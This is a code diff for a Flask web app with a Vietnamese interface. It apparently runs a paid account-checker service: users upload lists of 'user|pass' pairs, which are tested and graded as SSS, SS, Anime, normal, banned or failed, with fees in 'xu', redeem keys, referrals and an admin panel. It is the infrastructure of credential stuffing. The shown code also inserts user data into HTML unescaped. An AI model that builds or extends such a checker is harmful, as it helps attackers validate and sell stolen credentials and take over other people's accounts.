+    {f'<div class="card"><h3 class="card-title"><span class="card-title-icon">◉</span> Kết Quả</h3><div class="result-box">{result}</div></div>' if result else ''}
+
+    <div class="card">
+        <h2 class="card-title"><span class="card-title-icon">◐</span> Thống Kê Cá Nhân</h2>
+        <div class="stat-grid">
+            <div class="stat-box"><div class="stat-value">{m.get('total_acc', 0)}</div><div class="stat-label">Tổng Acc Đã Check</div></div>
+            <div class="stat-box"><div class="stat-value">{m.get('sss', 0)}</div><div class="stat-label">SSS</div></div>
+            <div class="stat-box"><div class="stat-value">{m.get('ss', 0)}</div><div class="stat-label">SS</div></div>
+            <div class="stat-box"><div class="stat-value">{m.get('anime', 0)}</div><div class="stat-label">Anime</div></div>
+        </div>
+    </div>
+    '''
+    return render_page(content, active_tab="check", user=user)
+
+@app.route("/check_file", methods=["GET", "POST"])
+@login_required
+def check_file():
+    user = get_current_user()
+    result = None
+    dl_id = None
+    if request.method == "POST":
+        if "file" not in request.files:
+            flash("Chưa chọn file!", "error")
+        else:
+            f = request.files["file"]
+            if not f.filename.endswith(".txt"):
+                flash("Chỉ nhận file .txt!", "error")
+            else:
+                content = f.read().decode("utf-8", errors="ignore")
+                accs = parse_file_content(content)
+                if not accs:
+                    flash("Không tìm thấy acc hợp lệ!", "error")
+                else:
+                    total = len(accs)
+                    xu = (total + 44) // 45
+                    if user["balance"] < xu:
+                        flash(f"Cần {xu} xu, có {user['balance']}!", "error")
+                    else:
+                        user["balance"] -= xu
+                        maxc = min(total, 50)
+                        results = []
+                        for u, p in accs[:maxc]:
+                            results.append(run_single_check(u, p))
+                        sss_c = sum(1 for r in results if r["type"] == "sss")
+                        ss_c = sum(1 for r in results if r["type"] == "ss")
+                        an_c = sum(1 for r in results if r["type"] == "anime")
+                        ban_c = sum(1 for r in results if r["type"] == "banned")
+                        norm_c = sum(1 for r in results if r["type"] == "normal")
+                        fail_c = sum(1 for r in results if r["type"] == "failed")
+                        summary = (f"◈ HOÀN TẤT!\n"
+                                   f"├─ Đã check: {maxc}/{total}\n"
+                                   f"├─ SSS: {sss_c}\n"
+                                   f"├─ SS: {ss_c}\n"
+                                   f"├─ Anime: {an_c}\n"
+                                   f"├─ Trắng: {norm_c}\n"
+                                   f"├─ Ban: {ban_c}\n"
+                                   f"└─ Trượt: {fail_c}\n\n")
+                        details = "\n\n".join(format_result(r, short=True) for r in results[:15])
+                        result = summary + details
+                        user["mission"]["total_acc"] = user["mission"].get("total_acc", 0) + total
+                        user["mission"]["sss"] = user["mission"].get("sss", 0) + sss_c
+                        user["mission"]["ss"] = user["mission"].get("ss", 0) + ss_c
+                        user["mission"]["anime"] = user["mission"].get("anime", 0) + an_c
+                        save_data()
+    content = f'''
+    <div class="tab-scroll">
+        <a href="/check" class="tab-chip">◈ Check Acc</a>
+        <a href="/check_file" class="tab-chip active">▣ Check File</a>
+        <a href="/enter_code" class="tab-chip">◆ Nhập Code</a>
+    </div>
+
+    <div class="card">
+        <h2 class="card-title"><span class="card-title-icon">▣</span> Check File</h2>
+        <p style="color:var(--text-secondary); margin-bottom:16px; font-size:0.9em;">Upload file .txt chứa danh sách acc (mỗi dòng 1 acc dạng user|pass)</p>
+        <div style="background:var(--bg-secondary); padding:12px; border-radius:10px; margin-bottom:16px; font-size:0.85em;">
+            <div class="info-row"><span class="info-label">Phí</span><span class="info-value">45 acc = 1 xu</span></div>
+            <div class="info-row"><span class="info-label">Số dư</span><span class="info-value">{user['balance']} xu</span></div>
+        </div>
+        {render_flash()}
+        <form method="POST" enctype="multipart/form-data">
+            <div class="form-group">
+                <label class="form-label">File danh sách</label>
+                <input type="file" name="file" class="form-input" accept=".txt" required>
+            </div>
+            <button type="submit" class="btn btn-block">UPLOAD & CHECK</button>
+        </form>
+    </div>
+
+    {f'<div class="card"><h3 class="card-title">◉ Kết Quả</h3><div class="result-box">{result}</div></div>' if result else ''}
+    '''
+    return render_page(content, active_tab="check", user=user)
+
+@app.route("/enter_code", methods=["GET", "POST"])
+@login_required
+def enter_code():
+    user = get_current_user()
+    if request.method == "POST":
+        code = request.form.get("code", "").strip()
+        if code in GENERATED_KEYS:
+            k = GENERATED_KEYS[code]
+            if k["remaining_uses"] > 0:
+                k["remaining_uses"] -= 1
+                if k.get("type") == "day":
+                    user["temp_balance"] = user.get("temp_balance", 0) + k["check_count"]
+                else:
+                    user["balance"] = user.get("balance", 0) + k["check_count"]
+                if k["remaining_uses"] <= 0: del GENERATED_KEYS[code]
+                save_data()
+                flash(f"Nhập code thành công! +{k['check_count']} lượt", "success")
+            else:
+                flash("Code đã hết lượt!", "error")
+        else:
+            flash("Code không hợp lệ!", "error")
+    content = f'''
+    <div class="tab-scroll">
+        <a href="/check" class="tab-chip">◈ Check Acc</a>
+        <a href="/check_file" class="tab-chip">▣ Check File</a>
+        <a href="/enter_code" class="tab-chip active">◆ Nhập Code</a>
+    </div>
+
+    <div class="card">
+        <h2 class="card-title"><span class="card-title-icon">◆</span> Nhập Code</h2>
+        <p style="color:var(--text-secondary); margin-bottom:16px; font-size:0.9em;">Nhập code do admin cấp để nhận lượt check</p>
+        {render_flash()}
+        <form method="POST">
+            <div class="form-group">
+                <label class="form-label">Mã Code</label>
+                <input type="text" name="code" class="form-input" placeholder="Nhập code..." required style="text-transform:uppercase;">
+            </div>
+            <button type="submit" class="btn btn-success btn-block">XÁC NHẬN</button>
+        </form>
+    </div>
+
+    <div class="card">
+        <h3 class="card-title">◐ Hướng Dẫn</h3>
+        <div class="info-row"><span class="info-label">Format</span><span class="info-value">TÊN_CODE</span></div>
+        <div class="info-row"><span class="info-label">Loại key</span><span class="info-value">Vĩnh viễn / Theo ngày</span></div>
+        <div class="info-row"><span class="info-label">Liên hệ</span><span class="info-value">@admin</span></div>
+    </div>
+    '''
+    return render_page(content, active_tab="check", user=user)
+
+@app.route("/tu_tien", methods=["GET"])
+@login_required
+def tu_tien():
+    user = get_current_user()
+    cul = user.get("cultivation", {})
+    lvl = cul.get("level", 0)
+    lvl_name = CULTIVATION_LEVELS[lvl]["name"] if lvl < len(CULTIVATION_LEVELS) else "MAX"
+    nxt = CULTIVATION_LEVELS[lvl + 1]["exp"] if lvl < len(CULTIVATION_LEVELS) - 1 else "MAX"
+    mp_name = MON_PHAI[cul["mon_phai"]]["name"] if cul.get("mon_phai") else "Chưa có"
+    action = request.args.get("action", "main")
+
+    body = ""
+    if action == "tuluyen":
+        body = f'''
+        <div class="card">
+            <h3 class="card-title">⚡ Tu Luyện</h3>
+            <p style="color:var(--text-secondary); margin-bottom:16px;">Tu luyện không giới hạn để tăng EXP</p>
+            <form method="POST" action="/tu_tien/tuluyen">
+                <button type="submit" class="btn btn-block">⚡ TU LUYỆN NGAY</button>
+            </form>
+        </div>
+        '''
+    elif action == "vukhi":
+        rows = ""
+        for wid, w in VU_KHI.items():
+            rows += f'''<div class="list-item">
+                <div><div style="font-weight:700;">{w['name']}</div><div style="font-size:0.8em; color:var(--text-secondary);">ATK +{w['atk']}</div></div>
+                <form method="POST" action="/tu_tien/vukhi/buy" style="margin:0;">
+                    <input type="hidden" name="weapon_id" value="{wid}">
+                    <button type="submit" class="btn btn-sm">MUA {w['cost']}</button>
+                </form>
+            </div>'''
+        body = f'<div class="card"><h3 class="card-title">⚡ Vũ Khí</h3><p style="margin-bottom:16px; color:var(--text-secondary);">Số dư: <b style="color:var(--accent-primary);">{user["balance"]}</b> lượt</p>{rows}</div>'
+    elif action == "monphai":
+        if cul.get("mon_phai"):
+            mp = MON_PHAI[cul["mon_phai"]]
+            cost = (cul.get("mon_phai_level", 0) + 1) * 50
+            body = f'''<div class="card">
+                <h3 class="card-title">⚔ Môn Phái</h3>
+                <div class="info-row"><span class="info-label">Môn phái</span><span class="info-value">{mp['name']}</span></div>
+                <div class="info-row"><span class="info-label">Cấp</span><span class="info-value">{cul.get('mon_phai_level', 0) + 1}</span></div>
+                <div class="info-row"><span class="info-label">Bonus ATK</span><span class="info-value">+{mp['bonus_atk']}</span></div>
+                <div class="info-row"><span class="info-label">Bonus DEF</span><span class="info-value">+{mp['bonus_def']}</span></div>
+                <div class="info-row"><span class="info-label">Bonus HP</span><span class="info-value">+{mp['bonus_hp']}</span></div>
+                <form method="POST" action="/tu_tien/monphai/upgrade" style="margin-top:16px;">
+                    <button type="submit" class="btn btn-block">⬆ NÂNG CẤP ({cost} LƯỢT)</button>
+                </form>
+            </div>'''
+        else:
+            cards = ""
+            for mid, mp in MON_PHAI.items():
+                cards += f'''<form method="POST" action="/tu_tien/monphai/join" style="margin-bottom:8px;">
+                    <input type="hidden" name="mp_id" value="{mid}">
+                    <button type="submit" class="btn btn-secondary btn-block" style="justify-content:space-between;">
+                        <span>{mp['name']}</span>
+                        <span style="font-size:0.8em; color:var(--accent-primary);">+ATK:{mp['bonus_atk']} +DEF:{mp['bonus_def']} +HP:{mp['bonus_hp']}</span>
+                    </button>
+                </form>'''
+            body = f'<div class="card"><h3 class="card-title">⚔ Chọn Môn Phái</h3>{cards}</div>'
+    else:
+        body = f'''
+        <div class="card">
+            <h2 class="card-title">⚔ Tu Tiên Giới</h2>
+            <div class="stat-grid">
+                <div class="stat-box"><div class="stat-value" style="font-size:1.3em;">{lvl_name}</div><div class="stat-label">Cảnh Giới</div></div>
+                <div class="stat-box"><div class="stat-value" style="font-size:1.3em;">{cul.get('exp', 0)}</div><div class="stat-label">Kinh Nghiệm</div></div>
+                <div class="stat-box"><div class="stat-value" style="font-size:1.3em;">{cul.get('hp', 0)}</div><div class="stat-label">HP</div></div>
+                <div class="stat-box"><div class="stat-value" style="font-size:1.3em;">{cul.get('atk', 0)}</div><div class="stat-label">ATK</div></div>
+                <div class="stat-box"><div class="stat-value" style="font-size:1.3em;">{cul.get('def', 0)}</div><div class="stat-label">DEF</div></div>
+                <div class="stat-box"><div class="stat-value" style="font-size:1.3em;">{mp_name}</div><div class="stat-label">Môn Phái</div></div>
+            </div>
+            <div style="margin-top:16px; display:flex; flex-wrap:wrap; gap:8px;">
+                <a href="/tu_tien?action=tuluyen" class="btn">⚡ Tu Luyện</a>
+                <a href="/tu_tien?action=vukhi" class="btn btn-secondary">⚡ Vũ Khí</a>
+                <a href="/tu_tien?action=monphai" class="btn btn-secondary">⚔ Môn Phái</a>
+            </div>
+        </div>
+        '''
+    content = f'''
+    <div class="tab-scroll">
+        <a href="/tu_tien" class="tab-chip active">⚔ Tu Tiên</a>
+        <a href="/tu_tien?action=vukhi" class="tab-chip">⚡ Vũ Khí</a>
+    </div>
+    {render_flash()}
+    {body}
+    '''
+    return render_page(content, active_tab="tu_tien", user=user)
+
+@app.route("/tu_tien/tuluyen", methods=["POST"])
+@login_required
+def tu_tien_tuluyen():
+    user = get_current_user()
+    cul = user["cultivation"]
+    if cul["level"] >= len(CULTIVATION_LEVELS) - 1:
+        flash("Đã đạt cảnh giới cao nhất!", "success")
+    else:
+        gain = random.randint(10, 30) + cul["level"] * 5
+        cul["exp"] = cul.get("exp", 0) + gain
+        while cul["level"] < len(CULTIVATION_LEVELS) - 1 and cul["exp"] >= CULTIVATION_LEVELS[cul["level"] + 1]["exp"]:
+            cul["level"] += 1
+            cul["hp"] = CULTIVATION_LEVELS[cul["level"]]["hp"]
+            cul["atk"] = CULTIVATION_LEVELS[cul["level"]]["atk"]
+            cul["def"] = CULTIVATION_LEVELS[cul["level"]]["def"]
+            flash(f"Đột phá! {CULTIVATION_LEVELS[cul['level']]['name']}", "success")
+        flash(f"+{gain} EXP", "success")
+        save_data()
+    return redirect(url_for("tu_tien", action="tuluyen"))
+
+@app.route("/tu_tien/vukhi/buy", methods=["POST"])
+@login_required
+def tu_tien_buy_weapon():
+    user = get_current_user()
+    wid = request.form.get("weapon_id", "")
+    if wid in VU_KHI:
+        w = VU_KHI[wid]
+        if user["balance"] < w["cost"]:
+            flash("Không đủ lượt!", "error")
+        else:
+            user["balance"] -= w["cost"]
+            user["cultivation"]["weapon"] = wid
+            save_data()
+            flash(f"Đã mua {w['name']}!", "success")
+    return redirect(url_for("tu_tien", action="vukhi"))
+
+@app.route("/tu_tien/monphai/join", methods=["POST"])
+@login_required
+def tu_tien_join_monphai():
+    user = get_current_user()
+    mid = request.form.get("mp_id", "")
+    if mid in MON_PHAI:
+        user["cultivation"]["mon_phai"] = mid
+        user["cultivation"]["mon_phai_level"] = 0
+        save_data()
+        flash(f"Đã gia nhập {MON_PHAI[mid]['name']}!", "success")
+    return redirect(url_for("tu_tien", action="monphai"))
+
+@app.route("/tu_tien/monphai/upgrade", methods=["POST"])
+@login_required
+def tu_tien_upgrade_monphai():
+    user = get_current_user()
+    cul = user["cultivation"]
+    if not cul.get("mon_phai"):
+        flash("Chưa gia nhập môn phái!", "error")
+    else:
+        cost = (cul.get("mon_phai_level", 0) + 1) * 50
+        if user["balance"] < cost:
+            flash(f"Cần {cost} lượt!", "error")
+        else:
+            user["balance"] -= cost
+            cul["mon_phai_level"] = cul.get("mon_phai_level", 0) + 1
+            save_data()
+            flash("Nâng cấp thành công!", "success")
+    return redirect(url_for("tu_tien", action="monphai"))
+
+@app.route("/profile")
+@login_required
+def profile():
+    user = get_current_user()
+    cul = user.get("cultivation", {})
+    lvl_name = CULTIVATION_LEVELS[cul.get("level", 0)]["name"] if cul.get("level", 0) < len(CULTIVATION_LEVELS) else "MAX"
+    last_ci = user.get("last_checkin", 0)
+    now = time.time()
+    can_checkin = now - last_ci >= 86400
+    if can_checkin:
+        ci_status = "Có thể điểm danh"
+    else:
+        rem = int(86400 - (now - last_ci))
+        h = rem // 3600
+        m = (rem % 3600) // 60
+        ci_status = f"Còn {h}h {m}m"
+
+    content = f'''
+    <div class="tab-scroll">
+        <a href="/profile" class="tab-chip active">◐ Cá Nhân</a>
+        <a href="/history" class="tab-chip">▤ Lịch Sử</a>
+        <a href="/invite" class="tab-chip">◇ Mời Bạn</a>
+        <a href="/mission" class="tab-chip">✦ Sứ Mệnh</a>
+    </div>
+
+    <div class="card">
+        <h2 class="card-title"><span class="card-title-icon">◐</span> Thông Tin Cá Nhân</h2>
+        <div class="info-row"><span class="info-label">Username</span><span class="info-value">{user['username']}</span></div>
+        <div class="info-row"><span class="info-label">ID của bạn</span><span class="info-value" style="font-family:monospace; color:var(--accent-primary);">{user['id']}</span></div>
+        <div class="info-row"><span class="info-label">Số dư chính</span><span class="info-value">{user.get('balance', 0)}</span></div>
+        <div class="info-row"><span class="info-label">Lượt tạm thời</span><span class="info-value">{user.get('temp_balance', 0)}</span></div>
+        <div class="info-row"><span class="info-label">Tổng lượt</span><span class="info-value" style="color:var(--accent-primary);">{user.get('balance', 0) + user.get('temp_balance', 0)}</span></div>
+        <div class="info-row"><span class="info-label">Người đã mời</span><span class="info-value">{user.get('referrals', 0)}</span></div>
+        <div class="info-row"><span class="info-label">Cảnh giới</span><span class="info-value">{lvl_name}</span></div>
+        <div class="info-row"><span class="info-label">Ngày tham gia</span><span class="info-value">{datetime.fromtimestamp(user.get('created_at', time.time())).strftime('%d/%m/%Y')}</span></div>
+    </div>
+
+    <div class="card">
+        <h2 class="card-title"><span class="card-title-icon">◉</span> Điểm Danh Hàng Ngày</h2>
+        <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{ci_status}</span></div>
+        <div class="info-row"><span class="info-label">Phần thưởng</span><span class="info-value">+{DAILY_REWARD} lượt</span></div>
+        <div class="info-row"><span class="info-label">Chuỗi điểm danh</span><span class="info-value">{user.get('checkin_streak', 0)} ngày</span></div>
+        <div class="info-row"><span class="info-label">Tổng điểm danh</span><span class="info-value">{user.get('total_checkins', 0)} lần</span></div>
+        {render_flash()}
+        <form method="POST" action="/daily" style="margin-top:16px;">
+            <button type="submit" class="btn btn-success btn-block" {'disabled' if not can_checkin else ''}>
+                {'✓ ĐIỂM DANH NGAY' if can_checkin else '◷ ĐÃ ĐIỂM DANH'}
+            </button>
+        </form>
+    </div>
+    '''
+    return render_page(content, active_tab="profile", user=user)
+
+@app.route("/daily", methods=["POST"])
+@login_required
+def daily():
+    user = get_current_user()
+    now = time.time()
+    if now - user.get("last_checkin", 0) < 86400:
+        flash("Bạn đã điểm danh hôm nay rồi!", "error")
+    else:
+        last = user.get("last_checkin", 0)
+        if last > 0 and now - last < 172800:
+            user["checkin_streak"] = user.get("checkin_streak", 0) + 1
+        else:
+            user["checkin_streak"] = 1
+        user["balance"] += DAILY_REWARD
+        user["last_checkin"] = now
+        user["total_checkins"] = user.get("total_checkins", 0) + 1
+        save_data()
+        flash(f"Điểm danh thành công! +{DAILY_REWARD} lượt", "success")
+    return redirect(url_for("profile"))
+
+@app.route("/history")
+@login_required
+def history():
+    user = get_current_user()
+    hist = user.get("history", [])[::-1]
+    rows = ""
+    if hist:
+        for h in hist[:50]:
+            color = {"sss": "#ffb800", "ss": "#00e5ff", "anime": "#e040fb", "normal": "#8b8b9a",
+                     "banned": "#ff2951", "failed": "#5a5a6e"}.get(h.get("result", ""), "#8b8b9a")
+            rows += f'''<div class="list-item">
+                <div>
+                    <div style="font-family:monospace; font-weight:600;">{h['acc']}</div>
+                    <div style="font-size:0.75em; color:var(--text-muted);">{h['time']}</div>
+                </div>
+                <div style="padding:4px 10px; background:{color}20; color:{color}; border-radius:8px; font-size:0.75em; font-weight:700; text-transform:uppercase;">{h['result']}</div>
+            </div>'''
+    else:
+        rows = '<p style="text-align:center; color:var(--text-secondary); padding:20px;">Chưa có lịch sử check</p>'
+    content = f'''
+    <div class="tab-scroll">
+        <a href="/profile" class="tab-chip">◐ Cá Nhân</a>
+        <a href="/history" class="tab-chip active">▤ Lịch Sử</a>
+        <a href="/invite" class="tab-chip">◇ Mời Bạn</a>
+        <a href="/mission" class="tab-chip">✦ Sứ Mệnh</a>
+    </div>
+    <div class="card">
+        <h2 class="card-title"><span class="card-title-icon">▤</span> Lịch Sử Check</h2>
+        {rows}
+    </div>
+    '''
+    return render_page(content, active_tab="profile", user=user)
+
+@app.route("/invite")
+@login_required
+def invite():
+    user = get_current_user()
+    content = f'''
+    <div class="tab-scroll">
+        <a href="/profile" class="tab-chip">◐ Cá Nhân</a>
+        <a href="/history" class="tab-chip">▤ Lịch Sử</a>
+        <a href="/invite" class="tab-chip active">◇ Mời Bạn</a>
+        <a href="/mission" class="tab-chip">✦ Sứ Mệnh</a>
+    </div>
+    <div class="card">
+        <h2 class="card-title"><span class="card-title-icon">◇</span> Mời Bạn Bè</h2>
+        <p style="color:var(--text-secondary); margin-bottom:16px;">Chia sẻ ID của bạn cho bạn bè. Khi họ đăng ký, cả hai đều nhận thưởng!</p>
+        <div class="form-group">
+            <label class="form-label">ID của bạn</label>
+            <input type="text" class="form-input" value="{user['id']}" readonly style="font-family:monospace; font-size:1.1em; text-align:center; color:var(--accent-primary); font-weight:700;">
+        </div>
+        <div class="stat-grid" style="margin-bottom:16px;">
+            <div class="stat-box"><div class="stat-value">+{REFERRAL_REWARD}</div><div class="stat-label">Bạn nhận</div></div>
+            <div class="stat-box"><div class="stat-value">+{REFERRAL_BONUS}</div><div class="stat-label">Bạn bè nhận</div></div>
+        </div>
+        <div class="info-row"><span class="info-label">Số người đã mời</span><span class="info-value">{user.get('referrals', 0)}</span></div>
+    </div>
+    '''
+    return render_page(content, active_tab="profile", user=user)
+
+@app.route("/mission")
+@login_required
+def mission():
+    user = get_current_user()
+    m = user.get("mission", {})
+    claimed = set(m.get("claimed", []))
+    rows = ""
+    for ms in MISSION_MILESTONES:
+        reward = MISSION_REWARDS[ms]
+        if ms in claimed:
+            status = '<span style="color:var(--success); font-weight:700;">✓ ĐÃ NHẬN</span>'
+            btn = ""
+        elif m.get("total_acc", 0) >= ms:
+            status = '<span style="color:var(--warning); font-weight:700;">◉ CÓ THỂ NHẬN</span>'
+            btn = f'''<form method="POST" action="/mission/claim" style="margin:0;">
+                <input type="hidden" name="milestone" value="{ms}">
+                <button type="submit" class="btn btn-sm btn-success">NHẬN</button>
+            </form>'''
+        else:
+            status = f'<span style="color:var(--text-muted);">◷ CẦN {ms - m.get("total_acc", 0)} ACC</span>'
+            btn = ""
+        rows += f'''<div class="list-item">
+            <div>
+                <div style="font-weight:700;">{ms} ACC</div>
+                <div style="font-size:0.85em; color:var(--accent-primary); font-weight:700;">+{reward} lượt</div>
+            </div>
+            <div style="display:flex; gap:8px; align-items:center;">{status}{btn}</div>
+        </div>'''
+    content = f'''
+    <div class="tab-scroll">
+        <a href="/profile" class="tab-chip">◐ Cá Nhân</a>
+        <a href="/history" class="tab-chip">▤ Lịch Sử</a>
+        <a href="/invite" class="tab-chip">◇ Mời Bạn</a>
+        <a href="/mission" class="tab-chip active">✦ Sứ Mệnh</a>
+    </div>
+    <div class="card">
+        <h2 class="card-title"><span class="card-title-icon">✦</span> Sổ Sứ Mệnh</h2>
+        <div class="stat-grid">
+            <div class="stat-box"><div class="stat-value">{m.get('total_acc', 0)}</div><div class="stat-label">Tổng Acc</div></div>
+            <div class="stat-box"><div class="stat-value">{m.get('sss', 0)}</div><div class="stat-label">SSS</div></div>
+            <div class="stat-box"><div class="stat-value">{m.get('ss', 0)}</div><div class="stat-label">SS</div></div>
+            <div class="stat-box"><div class="stat-value">{m.get('anime', 0)}</div><div class="stat-label">Anime</div></div>
+        </div>
+    </div>
+    <div class="card">
+        <h3 class="card-title">◈ Mốc Thưởng</h3>
+        {render_flash()}
+        {rows}
+    </div>
+    '''
+    return render_page(content, active_tab="profile", user=user)
+
+@app.route("/mission/claim", methods=["POST"])
+@login_required
+def mission_claim():
+    user = get_current_user()
+    ms = int(request.form.get("milestone", 0))
+    m = user.get("mission", {})
+    if ms in MISSION_MILESTONES and ms not in m.get("claimed", []) and m.get("total_acc", 0) >= ms:
+        user["balance"] += MISSION_REWARDS[ms]
+        m.setdefault("claimed", []).append(ms)
+        save_data()
+        flash(f"Nhận +{MISSION_REWARDS[ms]} lượt!", "success")
+    return redirect(url_for("mission"))
+
+@app.route("/notifications")
+@login_required
+def notifications():
+    user = get_current_user()
+    mark_read(session["username"])
+    items = ""
+    for n in reversed(NOTIFICATIONS):
+        items += f'''<div class="card" style="border-left:3px solid var(--accent-primary);">
+            <div style="display:flex; justify-content:space-between; align-items:start; margin-bottom:8px;">
+                <div style="font-weight:700; font-size:1.05em;">{n['title']}</div>
+                <div style="font-size:0.75em; color:var(--text-muted);">{n['time']}</div>
+            </div>
+            <div style="font-size:0.85em; color:var(--text-secondary); margin-bottom:8px;">Từ: <b style="color:var(--accent-primary);">{n['admin']}</b></div>
+            <div style="line-height:1.6; font-size:0.9em; white-space:pre-wrap;">{n['content']}</div>
+        </div>'''
+    if not items:
+        items = '<div class="card"><p style="text-align:center; color:var(--text-secondary); padding:20px;">Chưa có thông báo nào</p></div>'
+    content = f'''
+    <div class="card">
+        <h2 class="card-title"><span class="card-title-icon">◉</span> Thông Báo</h2>
+        <p style="color:var(--text-secondary); font-size:0.9em;">Tất cả thông báo từ admin</p>
+    </div>
+    {items}
+    '''
+    return render_page(content, active_tab="notifications", user=user)
+
+@app.route("/api/notif")
+def api_notif():
+    if "username" not in session:
+        return jsonify({"count": 0, "latest": None})
+    u = USERS.get(session["username"])
+    if not u: return jsonify({"count": 0, "latest": None})
+    lr = u.get("last_notif_read", 0)
+    unread = [n for n in NOTIFICATIONS if n.get("timestamp", 0) > lr]
+    latest = None
+    if unread:
+        ln = unread[-1]
+        latest = {"id": ln["id"], "title": ln["title"], "content": ln["content"],
+                  "admin": ln["admin"], "time": ln["time"]}
+    return jsonify({"count": len(unread), "latest": latest})
+
+@app.route("/api/notif/read", methods=["POST"])
+def api_notif_read():
+    if "username" in session:
+        mark_read(session["username"])
+    return jsonify({"ok": True})
+
+# ============================ ADMIN ============================
+@app.route("/admin")
+@admin_required
+def admin_panel():
+    user = get_current_user()
+    tab = request.args.get("tab", "stats")
+    body = ""
+    if tab == "users":
+        rows = ""
+        for un, u in USERS.items():
+            rows += f'''<div class="list-item">
+                <div>
+                    <div style="font-weight:700;">{un} {'👑' if u.get('is_admin') else ''}</div>
+                    <div style="font-size:0.75em; color:var(--text-muted); font-family:monospace;">{u.get('id', 'N/A')}</div>
+                </div>
+                <div style="text-align:right;">
+                    <div style="color:var(--accent-primary); font-weight:700;">{u.get('balance', 0)}</div>
+                    <form method="POST" action="/admin/add_balance" style="display:flex; gap:4px; margin-top:4px;">
+                        <input type="hidden" name="username" value="{un}">
+                        <input type="number" name="amount" placeholder="+/-" class="form-input" style="width:80px; padding:4px 8px; font-size:0.8em;">
+                        <button type="submit" class="btn btn-sm">+</button>
+                    </form>
+                </div>
+            </div>'''
+        body = f'<div class="card"><h3 class="card-title">◐ Users ({len(USERS)})</h3>{rows}</div>'
+    elif tab == "keys":
+        rows = ""
+        for k, v in GENERATED_KEYS.items():
+            rows += f'''<div class="list-item">
+                <div><div style="font-family:monospace; font-weight:700; color:var(--accent-primary);">{k}</div>
+                <div style="font-size:0.75em; color:var(--text-muted);">{v['type']} · còn {v['remaining_uses']} lượt · +{v['check_count']}</div></div>
+                <form method="POST" action="/admin/delete_key" style="margin:0;">
+                    <input type="hidden" name="key" value="{k}">
+                    <button type="submit" class="btn btn-sm btn-danger">✕</button>
+                </form>
+            </div>'''
+        body = f'''
+        <div class="card">
+            <h3 class="card-title">◆ Tạo Key Mới</h3>
+            {render_flash()}
+            <form method="POST" action="/admin/create_key">
+                <div class="form-group"><label class="form-label">Tên key</label><input type="text" name="name" class="form-input" placeholder="VD: VIP2024" required></div>
+                <div class="form-group"><label class="form-label">Số lượt check</label><input type="number" name="check_count" class="form-input" placeholder="100" required min="1"></div>
+                <div class="form-group"><label class="form-label">Số lượt nhập</label><input type="number" name="uses" class="form-input" placeholder="10" required min="1"></div>
+                <div class="form-group"><label class="form-label">Loại key</label>
+                    <select name="key_type" class="form-input"><option value="forever">Vĩnh viễn</option><option value="day">Theo ngày</option></select>
+                </div>
+                <button type="submit" class="btn btn-block">TẠO KEY</button>
+            </form>
+        </div>
+        <div class="card"><h3 class="card-title">◈ Keys ({len(GENERATED_KEYS)})</h3>{rows or '<p style="text-align:center; color:var(--text-secondary);">Chưa có key</p>'}</div>
+        '''
+    elif tab == "notif":
+        rows = ""
+        for n in reversed(NOTIFICATIONS):
+            rows += f'''<div class="card">
+                <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
+                    <div style="font-weight:700;">{n['title']}</div>
+                    <div style="font-size:0.75em; color:var(--text-muted);">{n['time']}</div>
+                </div>
+                <div style="font-size:0.85em; color:var(--text-secondary); margin-bottom:8px;">Từ: {n['admin']}</div>
+                <div style="white-space:pre-wrap; font-size:0.9em; margin-bottom:8px;">{n['content']}</div>
+                <form method="POST" action="/admin/delete_notification" style="margin:0;">
+                    <input type="hidden" name="notif_id" value="{n['id']}">
+                    <button type="submit" class="btn btn-sm btn-danger">✕ XÓA</button>
+                </form>
+            </div>'''
+        body = f'''
+        <div class="card">
+            <h3 class="card-title">◉ Gửi Thông Báo Toàn Cầu</h3>
+            <p style="color:var(--text-secondary); font-size:0.85em; margin-bottom:16px;">Thông báo sẽ hiện popup cho TẤT CẢ user đang online</p>
+            {render_flash()}
+            <form method="POST" action="/admin/send_notification">
+                <div class="form-group"><label class="form-label">Tiêu đề</label><input type="text" name="title" class="form-input" placeholder="VD: Cập nhật mới!" required maxlength="100"></div>
+                <div class="form-group"><label class="form-label">Nội dung</label><textarea name="content" class="form-textarea" placeholder="Nội dung thông báo..." required></textarea></div>
+                <button type="submit" class="btn btn-warning btn-block">GỬI CHO TẤT CẢ</button>
+            </form>
+        </div>
+        <div class="card"><h3 class="card-title">▤ Lịch Sử ({len(NOTIFICATIONS)})</h3>{rows or '<p style="text-align:center; color:var(--text-secondary);">Chưa có thông báo</p>'}</div>
+        '''
+    else:
+        body = f'''
+        <div class="card">
+            <h2 class="card-title">◈ Thống Kê Hệ Thống</h2>
+            <div class="stat-grid">
+                <div class="stat-box"><div class="stat-value">{len(USERS)}</div><div class="stat-label">Tổng Users</div></div>
+                <div class="stat-box"><div class="stat-value">{len(GENERATED_KEYS)}</div><div class="stat-label">Tổng Keys</div></div>
+                <div class="stat-box"><div class="stat-value">{len(NOTIFICATIONS)}</div><div class="stat-label">Thông Báo</div></div>
+                <div class="stat-box"><div class="stat-value">{sum(1 for u in USERS.values() if u.get('is_admin'))}</div><div class="stat-label">Admins</div></div>
+            </div>
+        </div>
+        <div class="card">
+            <h3 class="card-title">⚡ Thao Tác Nhanh</h3>
+            <form method="POST" action="/admin/add_all">
+                <div class="form-group"><label class="form-label">Cộng lượt cho TẤT CẢ users</label><input type="number" name="amount" class="form-input" placeholder="VD: 100" required></div>
+                <button type="submit" class="btn btn-warning btn-block">CỘNG TẤT CẢ</button>
+            </form>
+        </div>
+        '''
+    content = f'''
+    <div class="tab-scroll">
+        <a href="/admin" class="tab-chip {'active' if tab == 'stats' else ''}">◈ Stats</a>
+        <a href="/admin?tab=users" class="tab-chip {'active' if tab == 'users' else ''}">◐ Users</a>
+        <a href="/admin?tab=keys" class="tab-chip {'active' if tab == 'keys' else ''}">◆ Keys</a>
+        <a href="/admin?tab=notif" class="tab-chip {'active' if tab == 'notif' else ''}">◉ Thông Báo</a>
+    </div>
+    {body}
+    '''
+    return render_page(content, active_tab="profile", user=user)
+
+@app.route("/admin/create_key", methods=["POST"])
+@admin_required
+def admin_create_key():
+    name = request.form.get("name", "").strip().upper()
+    try:
+        cc = int(request.form.get("check_count", 0))
+        us = int(request.form.get("uses", 0))
+    except ValueError:
+        flash("Số không hợp lệ!", "error")
+        return redirect(url_for("admin_panel", tab="keys"))
+    kt = request.form.get("key_type", "forever")
+    if not name or cc <= 0 or us <= 0:
+        flash("Dữ liệu không hợp lệ!", "error")
+        return redirect(url_for("admin_panel", tab="keys"))
+    key = name
